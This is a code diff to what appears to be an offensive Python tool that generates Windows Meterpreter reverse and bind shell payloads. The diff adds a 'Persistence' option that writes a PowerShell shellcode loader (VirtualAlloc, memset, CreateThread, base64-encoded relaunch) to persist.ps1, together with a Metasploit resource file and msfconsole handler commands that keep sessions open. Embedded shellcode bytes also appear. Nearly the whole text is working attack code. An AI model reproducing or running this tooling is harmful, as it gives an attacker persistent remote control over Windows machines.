@@ -160,7 +160,7 @@ windows_met_bind_shell = (
     "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
     "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")
 
-payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, powershellpayload, countforchar = '', '', '/etc/winpayloads', '', 0 , '', 0
+payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount = '', '', '/etc/winpayloads', '', 0
 try:
     os.mkdir(payloaddir)
 except OSError:
@@ -177,7 +177,7 @@ print "   /____/".center(t.width)
 print t.normal + '=' * t.width
 
 try:
-    print '[1] Windows Stageless Reverse Shell'.center(t.width) + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + '[4] Windows Meterpreter Reverse Shell(Raw)'.center(t.width)
+    print '[1] Windows Stageless Reverse Shell'.center(t.width) + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + '[4] Windows Meterpreter Reverse Shell(Raw)'.center(t.width)+ '[5] Windows Meterpreter Reverse Shell(Persistence)'.center(t.width)
     print '=' * t.width
     menuchoice = raw_input('> ')
     if menuchoice == '1':
@@ -192,13 +192,16 @@ try:
     elif menuchoice == '4':
         payloadchoice = windows_met_rev_shell
         payload = 'Windows Meterpreter Reverse Raw '
+    elif menuchoice == '5':
+        payloadchoice = windows_met_rev_shell
+        payload = 'Windows Meterpreter Reverse Persistence '
     else:
         print t.bold_red + '[*] Wrong Selection' + t.normal
         sys.exit(1)
 
     print t.bold_green + '\n[*] Payload Set As %s\n' % (payload) + t.normal
 
-    if menuchoice == '1' or menuchoice == '2' or menuchoice == '4':
+    if menuchoice == '1' or menuchoice == '2' or menuchoice == '4' or menuchoice == '5':
         portnum = raw_input(
             '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
         if iperror == False:
@@ -233,8 +236,29 @@ try:
         raw_b64encode = raw_input('[*] Base64 Encode Raw Payload? y/[n]: ')
         if raw_b64encode.lower() == 'y':
             print '=' * int((t.width / 2)-5) + 'SHELLCODE' + '=' * int((t.width / 2)-4) + '\n' + base64.b64encode(shellcode) + '\n' + '=' * t.width
+            sys.exit()
         elif raw_b64encode.lower() == 'n' or raw_b64encode == '':
             print ez2read_shellcode
+            sys.exit()
+
+    if menuchoice == '5':
+        count = 0
+        newpayloadlayout = ''
+        for char in ez2read_shellcode:
+            count += 1
+            newpayloadlayout += char
+            if count == 4:
+                newpayloadlayout += ','
+                count = 0
+        persistencelayout = re.sub(r'\\x','0x',newpayloadlayout).rstrip(',')
+        persistence = """$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (persistencelayout)
+        persistencerc = """run post/windows/manage/smart_migrate\nrun post/windows/manage/powershell/exec_powershell SCRIPT=persist.ps1 SESSION=1"""
+        with open('persist.ps1','w') as persistfile:
+            persistfile.write(persistence)
+            persistfile.close()
+        with open('persist.rc','w') as persistfilerc:
+            persistfilerc.write(persistencerc)
+            persistfilerc.close()
 
     want_to_payloadinexe = raw_input(
         '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ')
@@ -303,12 +327,12 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
     elif menuchoice == '2':
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/smart_migrate;exploit\'' % portnum)
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/smart_migrate;set ExitOnSession false;exploit -j\'' % portnum)
     elif menuchoice == '3':
         bindip = raw_input(
             '\n[*] Enter Target Ip Address For Metasploit To Connect To The Bind Shell\n[*] IP> ')
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/smart_migrate;exploit \'' % (bindport, bindip))
-    elif menuchoice == '4':
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/smart_migrate;exploit\'' % portnum)
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/smart_migrate;set ExitOnSession false;exploit -j \'' % (bindport, bindip))
+    elif menuchoice == '5':
+        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
 except KeyboardInterrupt:
     sys.exit(1)
